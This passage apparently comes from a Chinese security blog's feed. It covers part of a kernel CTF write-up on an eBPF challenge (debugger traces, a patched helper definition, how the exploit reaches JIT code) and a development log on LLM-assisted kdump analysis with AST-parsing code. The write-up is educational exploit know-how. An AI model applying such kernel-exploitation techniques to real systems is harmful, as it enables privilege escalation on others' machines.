class="number">0xffffffff81c513e4</span> &lt;bpf_test_run+<span class="number">356</span>&gt;    mov    r13d, eax</span><br><span class="line">   <span class="number">0xffffffff81c513e7</span> &lt;bpf_test_run+<span class="number">359</span>&gt;    jmp    <span class="number">0xffffffff81c51382</span>          &lt;bpf_test_run+<span class="number">258</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xffffffff81c51382</span> &lt;bpf_test_run+<span class="number">258</span>&gt;    mov    dword ptr [r14], r13d</span><br><span class="line">   <span class="number">0xffffffff81c51385</span> &lt;bpf_test_run+<span class="number">261</span>&gt;    mov    rdi, qword ptr [rsp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xffffffff81c5138a</span> &lt;bpf_test_run+<span class="number">266</span>&gt;    mov    esi, <span class="number">0x200</span>                      ESI =&gt; <span class="number">0x200</span></span><br><span class="line">────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────</span><br><span class="line">In file: /run/media/zjw1nd/Data/ctf/<span class="number">2025</span>AliyunCTF/beebee_8a1bd1fde6215e85ebd1123bcf306bcdcbc74ec34fad1f0d1974fe6ff7590b45.tar/linux<span class="number">-6.6</span><span class="number">.74</span>/include/linux/bpf.h:<span class="number">1213</span></span><br><span class="line">   <span class="number">1208</span> <span class="type">static</span> __always_inline __nocfi <span class="type">unsigned</span> <span class="type">int</span> bpf_dispatcher_nop_func(</span><br><span class="line">   <span class="number">1209</span>         <span class="type">const</span> <span class="type">void</span> *ctx,</span><br><span class="line">   <span class="number">1210</span>         <span class="type">const</span> <span class="keyword">struct</span> bpf_insn *insnsi,</span><br><span class="line">   <span class="number">1211</span>         <span class="type">bpf_func_t</span> bpf_func)</span><br><span class="line">   <span class="number">1212</span> &#123;</span><br><span class="line"> ► <span class="number">1213</span>         <span class="keyword">return</span> bpf_func(ctx, insnsi);</span><br><span class="line">   <span class="number">1214</span> &#125;</span><br></pre></td></tr></table></figure><p>这里</p><p>然后他会用一个很巧妙的跳转来到JIT编译的代码处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0xffffffff81f49480</span> &lt;__x86_indirect_thunk_array&gt;       call   <span class="number">0xffffffff81f49486</span>          &lt;__x86_indirect_thunk_array+<span class="number">6</span>&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0xffffffff81f49485</span> &lt;__x86_indirect_thunk_array+<span class="number">5</span>&gt;     int3   </span><br><span class="line">► <span class="number">0xffffffff81f49486</span> &lt;__x86_indirect_thunk_array+<span class="number">6</span>&gt;     mov    qword ptr [rsp], rax        [<span class="number">0xffffc90000207cd0</span>] &lt;= <span class="number">0xffffffffc0000670</span> ◂— endbr64 </span><br><span class="line">  <span class="number">0xffffffff81f4948a</span> &lt;__x86_indirect_thunk_array+<span class="number">10</span>&gt;    ret    </span><br></pre></td></tr></table></figure><p>用一个<code>mov [rsp] rax;ret</code>完成了一次更加合法的<code>call rax</code>。而rax此时就是我们输入的代码位置了，从0xffffffffc0000670开始。到这里我们大概能明白这套东西的运作流程。</p><p>那它的栈帧又为什么会是刚刚指定的内容呢？</p><h2 id="核心的bpf字节码程序">核心的bpf字节码程序</h2><p>bpf字节码程序一共调用了三个函数，依次是<code>bpf_map_lookup_elem</code>,<code>aliyunctf_xor</code>和<code>skb_load_bytes</code>。</p><p>整个exp是这样的：先生成了一个只读的map{0:1}。查看这个patch中的 <code>bpf_iscc</code> 函数的参数限制，主要体现在 <code>bpf_iscc_proto</code> 结构体的定义中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_iscc_proto</span> =</span> &#123;</span><br><span class="line">.func = bpf_iscc,</span><br><span class="line">.gpl_only = <span class="literal">false</span>,</span><br><span class="line">.pkt_access = <span class="literal">true</span>,</span><br><span class="line">.ret_type = RET_INTEGER,</span><br><span class="line">.arg1_type = ARG_PTR_TO_FIXED_SIZE_MEM | MEM_UNINIT,</span><br><span class="line">.arg1_size = <span class="keyword">sizeof</span>(s64),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-285786.htm&quot;&gt;https://bbs.kanxue.com/thread-285786.htm&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;题目内容&lt;/</summary>
      
    
    
    
    <category term="WP" scheme="https://zjw1nd.github.io/categories/WP/"/>
    
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>网安实践之简单的固件漏洞利用</title>
    <link href="https://zjw1nd.github.io/2025/05/19/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B5%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://zjw1nd.github.io/2025/05/19/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B5%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2025-05-19T10:34:12.000Z</published>
    <updated>2025-05-19T10:34:12.135Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>基于LLM的kdump分析开发日志（持续更新）</title>
    <link href="https://zjw1nd.github.io/2025/04/30/%E5%9F%BA%E4%BA%8ELLM%E7%9A%84kdump%E5%88%86%E6%9E%90%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/04/30/%E5%9F%BA%E4%BA%8ELLM%E7%9A%84kdump%E5%88%86%E6%9E%90%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-04-30T08:25:02.000Z</published>
    <updated>2025-05-30T15:28:26.341Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近更新2025-04-05，基于ChatDBG和kdump-gdbserver实现了python便利地获取调试信息。最近更新2025-04-17，对脚本做了进一步封装且尝试新的思路最近更新2025-4-24，记录了思路的变化，现在思路从clang.cindex ast转换成使用clangd语言服务器做linux内核代码查找最近更新2025-4-30，记录了在lsp开发过程中问题的解决过程最近更新2025-5-21，记录了kgym相关内容</p></blockquote><h1>环境搭建</h1><p>参考<a href="https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/">这里</a></p><h1>Kdump的分析流程</h1><p>我对于AI相关的技术包括Agent之类一窍不通，所以先来看我熟悉的领域，内核的调试与分析。</p><blockquote><p><a href="https://www.cnblogs.com/muahao/p/7452737.html">https://www.cnblogs.com/muahao/p/7452737.html</a></p></blockquote><p>“LLM分析崩溃转储现场”这件事有开源项目在做，<a href="https://github.com/plasma-umass/ChatDBG">ChatDBG</a>就是一个例子。我先读了下这个项目的源码。更多的内容就不赘述，它是以gdb/pdb/lldb相关插件的形式工作的，以熟悉的gdb为例。它实现了一个&quot;why&quot;命令让LLM分析崩溃或者相关现场原因。</p><h2 id="ChatDBG的实现">ChatDBG的实现</h2><p>总体的思路是将相关的信息打包成结构化的数据发给LLM:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_initial_prompt</span>(<span class="params"></span></span><br><span class="line"><span class="params">    stack: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    error: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    details: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    command_line: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    inputs: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    history: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    extra: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="params">    user_text: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> _concat_prompt(</span><br><span class="line">        _wrap_it(<span class="string">&quot;The program has this stack trace&quot;</span>, stack),</span><br><span class="line">        _wrap_it(<span class="string">&quot;The program encountered the following error&quot;</span>, error, details),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This was the command line&quot;</span>, command_line),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This was the program&#x27;s input&quot;</span>, inputs),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This is the history of some debugger commands I ran&quot;</span>, history),</span><br><span class="line">        _wrap_it(<span class="string">&quot;&quot;</span>, extra),</span><br><span class="line">        _user_text_it(user_text),</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>这些传入的参数取决于各个调试器类自己的实现。对于gdb，其他的都好说，主要核心内容是它通过gdb-python接口对堆栈做了回溯，并且提取了对应的调试信息，将最顶部的三个堆栈处对应的上下十行的源代码加了行号之后都打包发给LLM。</p><p><strong>核心的思路就是想办法将人做的东西用代码自动化获取，结构化打包发给LLM，让它吐东西出来</strong></p><h2 id="问题">问题</h2><p>首先，gdb只支持ELF格式的镜像，需要对makedumpfile做一些配置。其对于地址的映射关系写在ELF头的LOAD字段里面。但是vmcore是按照物理地址映射的，在关闭kaslr的情况下，ELF头中只有直接映射地址区域的内容，而没有vmalloc相关的地址。内核如果使用vmalloc，尤其是用vmalloc分配栈，这会导致我们的栈地址无法访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#0  0xffffffff811d440b in crash_setup_regs (newregs=0xffffc900003cfd18, oldregs=0x0 &lt;fixed_percpu_data&gt;) at ./arch/x86/include/asm/kexec.h:111</span><br><span class="line">#1  __crash_kexec (regs=0x0 &lt;fixed_percpu_data&gt;) at kernel/crash_core.c:119</span><br><span class="line">Backtrace stopped: Cannot access memory at address 0xffffc900003cfdd0</span><br></pre></td></tr></table></figure><p>crash虽然没有这个问题，但是其操作很复杂且没有封装的api，模拟终端操作会很呆而且其不支持读取vmlinux的调试信息，要想把堆栈地址和源码对应，需要做单独的处理和转换，到时候还需要建立联系，非常麻烦。</p><p>以我个人的经验来说，想办法让gdb能够调试vmcore，然后用gdb-python api会比后者方便很多。我甚至考虑过修改vmcore的文件头，但是这更麻烦，并且每个dump文件都要重复。在目前我考虑头痛医头脚痛医脚的方法，在内核编译选项里关闭了<code>CONFIG_VMAP_STACK</code>，让内核栈不用vmalloc去分配，这样<em>暂时性地</em>解决了gdb无法读取内核栈地址的问题。然后采用gdb-python的api去回溯堆栈就可以了。</p><p>后续我发现了一个相关的库，有人以lib的形式实现了一个<a href="https://github.com/ptesarik/libkdumpfile">libkdumpfile</a>并提供了pykdumpfile的api，安装之后就可以用这套api在python解析vmcore文件而不用单独操作crash了。同时，这里还有一个用CS结构思想实现的<a href="https://github.com/ptesarik/kdump-gdbserver">kdump-gdbserver</a>,它能通过建立一个远程调试服务器的方法让gdb去attach vmcore，而且代码很轻量（建立在pykdumpfile的基础上）。</p><p>这无疑成为了我们的首选，经过<strong>不懈地测试</strong>，我<em>暂时</em>跑通了这玩意，并且测试成功，能够靠gdb命令来获取内核崩溃现场的堆栈信息了。说暂时是因为这个项目提供的gdb命令还是存在问题，没办法很好地分析现场的其他线程/任务，但是目前不太需要这些信息。有了gdb-python这个工具之后后续的很多事都是很简单的了，直接api调用即可。</p><blockquote><p>甚至神智不清到将vmlinux和vmcore匹配错了还认真提了个issue给人家发邮件orz，Peter老哥人很好，专门回复了我</p></blockquote><p>效果如下，这是测试函数效果时用注册的测试命令在gdb内部的输出:</p><p><img src="/images/kdump/src_from_bt.png" alt="src_from_bt.png"></p><h1>更好，更智能，更符合人类思维的检索方式（？）——AST</h1><p>文件路径获取还是比较僵硬的，下一步我们要为linux内核构建一个能够利用代码本身的依赖关系做查找的东西，利用AST。</p><p>Auto-code-rover开源的部分（分析python项目）直接就是用的python官方的ast库来实现相关的查找，所以理所当然地我们的思路也会来到这里。但是我们要分析的是linux内核的C代码，所以要请出clang了。这个开源的编译器工具链应当可以帮助我们精准地查询linux内核庞大的代码。</p><p>ast查询相关的内容有不少了，比如有一个rust实现的命令行工具<code>ast-grep</code>等等。而且clang有自己的python库，用<code>clang.cindex</code>模块就可以遍历ast进行查找。理所当然地我们能够用它查找一个C文件中的函数，结构体和宏：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文档作者: wzx</span></span><br><span class="line"><span class="comment"># 时间: 2025年4月1日</span></span><br><span class="line"><span class="comment"># 文件: ClangAstParser.py</span></span><br><span class="line"><span class="comment"># 文件作用: 实现文件语法解析</span></span><br><span class="line"><span class="comment"># Modified by zjl (actually Claude-3.7 lol)</span></span><br><span class="line"><span class="keyword">from</span> DataType <span class="keyword">import</span> StructMember,StructDef,FunctionDef,MacroDef</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> clang.cindex <span class="keyword">import</span> Index, CursorKind, TranslationUnit, TypeKind, Cursor</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Dict</span>, <span class="type">Optional</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ParseError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClangASTParser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, file_path: <span class="built_in">str</span>, kernel_root: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>, arch: <span class="built_in">str</span> = <span class="string">&#x27;x86&#x27;</span></span>):</span><br><span class="line">        self.file_path = os.path.abspath(file_path)</span><br><span class="line">        self.kernel_root = kernel_root <span class="keyword">or</span> self._auto_detect_kernel_root()</span><br><span class="line">        self.arch = arch</span><br><span class="line">        self.ast = self._parse_ast()</span><br><span class="line">        self.structs: <span class="type">List</span>[StructDef] = []</span><br><span class="line">        self.functions: <span class="type">List</span>[FunctionDef] = []</span><br><span class="line">        self.macros: <span class="type">List</span>[MacroDef] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_auto_detect_kernel_root</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;自动检测内核根目录&quot;&quot;&quot;</span></span><br><span class="line">        current_dir = os.path.dirname(self.file_path)</span><br><span class="line">        <span class="keyword">while</span> current_dir != <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(os.path.join(current_dir, <span class="string">&#x27;Kbuild&#x27;</span>)):</span><br><span class="line">                <span class="keyword">return</span> current_dir</span><br><span class="line">            current_dir = os.path.dirname(current_dir)</span><br><span class="line">        <span class="keyword">raise</span> ParseError(<span class="string">&quot;无法自动检测内核根目录，请手动指定 kernel_root&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_include_args</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成内核头文件包含路径&quot;&quot;&quot;</span></span><br><span class="line">        includes = [</span><br><span class="line">            <span class="string">&#x27;-I&#x27;</span>, os.path.join(self.kernel_root, <span class="string">&#x27;include&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;-I&#x27;</span>, os.path.join(self.kernel_root, <span class="string">&#x27;arch&#x27;</span>, self.arch, <span class="string">&#x27;include&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;-I&#x27;</span>, os.path.join(self.kernel_root, <span class="string">&#x27;include/uapi&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;-include&#x27;</span>, os.path.join(self.kernel_root, <span class="string">&#x27;include/linux/kconfig.h&#x27;</span>)</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">return</span> includes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_parse_ast</span>(<span class="params">self</span>) -&gt; TranslationUnit:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;解析生成 AST&quot;&quot;&quot;</span></span><br><span class="line">        index = Index.create()</span><br><span class="line">        args = [</span><br><span class="line">            <span class="string">&#x27;-D__KERNEL__&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-D__KASAN__&#x27;</span>,</span><br><span class="line">            <span class="string">f&#x27;-D__ARCH_<span class="subst">&#123;self.arch.upper()&#125;</span>_&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-nostdinc&#x27;</span>,  <span class="comment"># 忽略标准头文件</span></span><br><span class="line">            <span class="string">&#x27;-Wno-everything&#x27;</span>,  <span class="comment"># 禁用警告</span></span><br><span class="line">            *self._get_include_args()</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> index.parse(</span><br><span class="line">                self.file_path,</span><br><span class="line">                args=args,</span><br><span class="line">                options=TranslationUnit.PARSE_DETAILED_PROCESSING_RECORD</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> ParseError(<span class="string">f&quot;AST 解析失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_walk_ast</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;遍历 AST 并提取关键信息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> cursor.location.file <span class="keyword">and</span> cursor.location.file.name != self.file_path:</span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 跳过其他文件</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> cursor.kind == CursorKind.STRUCT_DECL <span class="keyword">and</span> cursor.is_definition():</span><br><span class="line">            self._process_struct(cursor)</span><br><span class="line">        <span class="keyword">elif</span> cursor.kind == CursorKind.TYPEDEF_DECL:</span><br><span class="line">            self._process_typedef(cursor)</span><br><span class="line">        <span class="keyword">elif</span> cursor.kind == CursorKind.FUNCTION_DECL:</span><br><span class="line">            self._process_function(cursor)</span><br><span class="line">        <span class="keyword">elif</span> cursor.kind == CursorKind.MACRO_DEFINITION:</span><br><span class="line">            self._process_macro(cursor)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 递归遍历子节点</span></span><br><span class="line">        <span class="keyword">for</span> child <span class="keyword">in</span> cursor.get_children():</span><br><span class="line">            self._walk_ast(child)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_process_struct</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理结构体定义&quot;&quot;&quot;</span></span><br><span class="line">        members = []</span><br><span class="line">        <span class="keyword">for</span> child <span class="keyword">in</span> cursor.get_children():</span><br><span class="line">            <span class="keyword">if</span> child.kind == CursorKind.FIELD_DECL:</span><br><span class="line">                member_type = self._get_type_name(child.<span class="built_in">type</span>)</span><br><span class="line">                bit_width = child.get_bitfield_width() <span class="keyword">if</span> child.is_bitfield() <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">                members.append(StructMember(child.spelling, member_type, bit_width))</span><br><span class="line">        </span><br><span class="line">        self.structs.append(</span><br><span class="line">            StructDef(</span><br><span class="line">                name=cursor.spelling,</span><br><span class="line">                members=members,</span><br><span class="line">                line_range=(cursor.extent.start.line, cursor.extent.end.line)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_process_typedef</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理 typedef 定义的结构体&quot;&quot;&quot;</span></span><br><span class="line">        underlying_type = cursor.underlying_typedef_type</span><br><span class="line">        <span class="keyword">if</span> underlying_type.get_declaration().kind == CursorKind.STRUCT_DECL:</span><br><span class="line">            struct_cursor = underlying_type.get_declaration()</span><br><span class="line">            <span class="keyword">if</span> struct_cursor.is_definition():</span><br><span class="line">                self._process_struct(struct_cursor)</span><br><span class="line">                <span class="comment"># 标记为 typedef</span></span><br><span class="line">                self.structs[-<span class="number">1</span>].is_typedef = <span class="literal">True</span></span><br><span class="line">                self.structs[-<span class="number">1</span>].name = cursor.spelling  <span class="comment"># 使用 typedef 名称</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_process_function</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理函数定义&quot;&quot;&quot;</span></span><br><span class="line">        return_type = self._get_type_name(cursor.result_type)</span><br><span class="line">        parameters = []</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> cursor.get_arguments():</span><br><span class="line">            param_type = self._get_type_name(param.<span class="built_in">type</span>)</span><br><span class="line">            parameters.append((param.spelling, param_type))</span><br><span class="line">        </span><br><span class="line">        self.functions.append(</span><br><span class="line">            FunctionDef(</span><br><span class="line">                name=cursor.spelling,</span><br><span class="line">                return_type=return_type,</span><br><span class="line">                parameters=parameters,</span><br><span class="line">                line_range=(cursor.extent.start.line, cursor.extent.end.line),</span><br><span class="line">                <span class="comment"># 添加光标</span></span><br><span class="line">                cursor=cursor</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_process_macro</span>(<span class="params">self, cursor: Cursor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理宏定义&quot;&quot;&quot;</span></span><br><span class="line">        macro_name = cursor.spelling</span><br><span class="line">        macro_token_generator = cursor.get_tokens()</span><br><span class="line">        macro_value = <span class="built_in">next</span>(macro_token_generator).spelling  </span><br><span class="line">        is_function_like = <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> macro_name  <span class="comment"># 简单判断是否为函数式宏</span></span><br><span class="line">        </span><br><span class="line">        self.macros.append(</span><br><span class="line">            MacroDef(</span><br><span class="line">                name=macro_name,</span><br><span class="line">                value=macro_value,</span><br><span class="line">                line=cursor.location.line,</span><br><span class="line">                is_function_like=is_function_like</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_type_name</span>(<span class="params">self, clang_type</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取类型的完整名称&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> clang_type.kind == TypeKind.POINTER:</span><br><span class="line">            pointee_type = self._get_type_name(clang_type.get_pointee())</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;pointee_type&#125;</span>*&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> clang_type.kind == TypeKind.ELABORATED:</span><br><span class="line">            <span class="keyword">return</span> clang_type.get_declaration().spelling</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> clang_type.spelling</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analyze</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行分析&quot;&quot;&quot;</span></span><br><span class="line">        self._walk_ast(self.ast.cursor)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_call_graph</span>(<span class="params">self</span>) -&gt; <span class="type">Dict</span>[<span 